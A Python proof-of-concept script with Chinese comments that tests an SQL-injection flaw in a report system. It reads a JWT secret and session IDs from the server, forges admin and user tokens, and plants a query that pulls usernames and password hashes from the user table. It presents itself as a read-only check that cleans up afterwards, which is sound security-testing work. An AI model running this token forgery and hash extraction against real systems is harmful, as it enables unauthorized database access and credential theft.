#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H5 SQL 注入利用性最终验证

关键：数据源 id=3 指向 report_system（主库），若可用则 DEPT_ADMIN 能直接拖库。
本测试只执行 SELECT（只读），验证后立即清理配置。
"""
import sys

from rsh import get_client, run

SCRIPT = r'''
import json, sys, time, urllib.request, urllib.error, urllib.parse, base64, hmac, hashlib
SECRET = sys.argv[1].encode(); A_SESS = sys.argv[2]; U_SESS = sys.argv[3]
BASE = "http://127.0.0.1:8763/api"

def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def tok(uid, name, sess):
    now = int(time.time())
    h = b64(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
    p = b64(json.dumps({"sub":name,"userId":uid,"username":name,"jti":sess,
                        "iat":now,"exp":now+1800}, separators=(",",":")).encode())
    return h + "." + p + "." + b64(hmac.new(SECRET, (h+"."+p).encode(), hashlib.sha256).digest())

def call(method, path, tk, params=None, body=None):
    url = BASE + path + (("?" + urllib.parse.urlencode(params)) if params else "")
    data = json.dumps(body, ensure_ascii=False).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    if tk: r.add_header("Authorization", "Bearer " + tk)
    if data: r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, timeout=60) as resp:
            return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:300]
    except Exception as e:
        return -1, str(e)

A = tok(1, "admin", A_SESS); U = tok(2, "user", U_SESS)

print("=" * 66)
print("[H5] SQL 注入利用性验证：目标是主库 report_system")
print("=" * 66)

# 步骤1: 用 admin 创建一个数据范围配置，数据源指向 3(report_system)，SQL 为恶意拖库语句
EVIL = "select id, username, password from sys_user LIMIT 2"
st, txt = call("POST", "/dataRange", A, body={
    "configName": "H5-POC", "datasourceId": 3, "sqlText": EVIL, "status": 1})
print("  1) admin 保存恶意配置 -> HTTP %s %s" % (st, txt[:150]))

st, txt = call("GET", "/dataRange/list", A)
poc_id = None
try:
    for it in (json.loads(txt).get("data") or []):
        if it.get("configName") == "H5-POC":
            poc_id = it["id"]; break
except Exception: pass
print("     配置 id =", poc_id)

if poc_id:
    # 步骤2: 用 user（普通部门管理员）预览 —— 若能拿到 sys_user 的密码哈希即证明可拖库
    st, txt = call("GET", "/dataRange/%d/preview" % poc_id, U)
    print("  2) user 预览执行 -> HTTP %s" % st)
    print("     响应: %s" % txt[:400])
    leaked = ("password" in txt and "$2a$" in txt)
    print("     ==> 是否泄露密码哈希: %s" % ("❌ 是（可拖库）" if leaked else "✅ 否"))

    # 步骤3: 清理
    st, txt = call("DELETE", "/dataRange/%d" % poc_id, A)
    print("  3) 清理配置 -> HTTP %s %s" % (st, txt[:80]))

print()
print("=" * 66)
print("[H2] 物化表导出：当前环境是否有可用数据源")
print("=" * 66)
st, txt = call("GET", "/template/page", A, {"page":1,"pageSize":10})
try:
    for it in (json.loads(txt).get("data") or {}).get("list", [])[:5]:
        print("  template id=%s name=%s datasourceId=%s materialized=%s" % (
            it.get("id"), it.get("templateName"), it.get("datasourceId"), it.get("materialized")))
except Exception as e:
    print("  解析失败", e)
'''


def upload_small(client, path, text):
    data = text.encode("utf-8")
    sftp = client.open_sftp()
    try:
        with sftp.file(path, "wb") as f:
            f.set_pipelined(False)
            for i in range(0, len(data), 1024):
                f.write(data[i:i+1024])
        return True
    finally:
        sftp.close()


def main():
    c = get_client()
    rc, out, _ = run("grep REPORT_JWT_SECRET /opt/report/report-api.env | cut -d= -f2", client=c)
    secret = out.strip().strip('"')
    mysql = "mysql -ureport -p***REMOVED_DB_PASSWORD*** report_system -B -N"
    sess = {}
    for uid in (1, 2):
        rc, out, _ = run(f'{mysql} -e "SELECT session_id FROM rpt_online_user WHERE user_id={uid} '
                         f'AND status=1 ORDER BY last_active_time DESC LIMIT 1;" 2>/dev/null', client=c)
        sess[uid] = out.strip().splitlines()[0] if out.strip() else None
    print(f"admin_s={sess[1]}\nuser_s={sess[2]}\n")
    upload_small(c, "/tmp/_h5.py", SCRIPT)
    rc, out, err = run(f"python3 /tmp/_h5.py '{secret}' {sess[1]} {sess[2]}", timeout=300, client=c)
    print(out)
    if err.strip():
        print("[stderr]", err[:400])
    c.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
